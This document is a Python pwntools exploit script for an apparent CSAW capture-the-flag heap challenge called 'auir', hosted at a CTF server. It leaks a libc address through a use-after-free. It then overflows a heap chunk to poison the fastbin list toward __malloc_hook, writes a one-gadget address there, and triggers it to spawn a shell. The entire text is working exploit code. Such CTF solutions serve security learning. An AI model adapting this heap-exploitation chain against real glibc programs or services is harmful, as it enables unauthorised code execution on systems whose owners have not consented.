
from pwn import *

def make(size, data, flag=False):
    p.sendline("1")
    p.recvuntil(">>")
    p.sendline(str(size))
    if flag==True:
        p.interactive()
    p.recvuntil(">>", timeout=1)
    p.sendline(str(data))
    p.recvuntil(">>", timeout=1)

def destroy(index):
    p.sendline("2") 
    p.recvuntil(">>")
    p.sendline(str(index))
    p.recvuntil(">>")


def fix(index, size, data):
    p.sendline("3")
    p.recvuntil(">>")
    p.sendline(str(index))
    p.recvuntil(">>")
    p.sendline(str(size))
    p.recvuntil(">>")
    p.sendline(str(data))
    p.recvuntil(">>")

def display(index):
    p.sendline("4")
    p.recvuntil(">>")
    p.sendline(str(index))
    p.recvuntil("\n")
    data = p.recvuntil("|")[:-1]
    p.recvuntil(">>")
    return u64(data)

if __name__ == "__main__":
#   p = process("./auir")
    p = remote("pwn.chal.csaw.io", 7713)
    p.recvuntil(">>")
    
    #Leak the Libc address by UAF
    make(0x80, "AAAABBBB")  #index 0
    make(0x80, "CCCCDDDD")  #index 1
    destroy(0)
    libcleak = display(0)
    libcbase = libcleak - 3951480
    Malchook = libcbase + 3951341
    Onegadget= libcbase + 0xf0274
    log.info("Libcleak: " + hex(libcleak))
    log.info("Libcbase: " + hex(libcbase))
    log.info("Malchook: " + hex(Malchook))
    log.info("Sheladdr: " + hex(Onegadget))
    destroy(1)
    
    #Overwrite the fastbin_free_list to __malloc_hook by heap overflow
    make(0x60, "AAAABBBB")  #idnex 2
    make(0x60, "AAAABBBB")  #index 3
    make(0x60, "AAAABBBB")  #index 4
    destroy(4)
    destroy(3)
    payload = p64(0x0) + p64(0xa) + p64(0x0)*11 + p64(0x71) + p64(Malchook)
    fix(2, len(payload), payload)   
    
    make(0x60, "AAAABBBB")  #index 5
    payload =  p8(0x0)*3 + p64(0x0)*2 + p64(Onegadget)
    make(0x60, payload)     #index 6
#   gdb.attach(p)
#   make(0x60, "AAAABBBB", True)
    destroy(5)
    p.sendline("2")
    p.sendline("5")
    p.interactive()
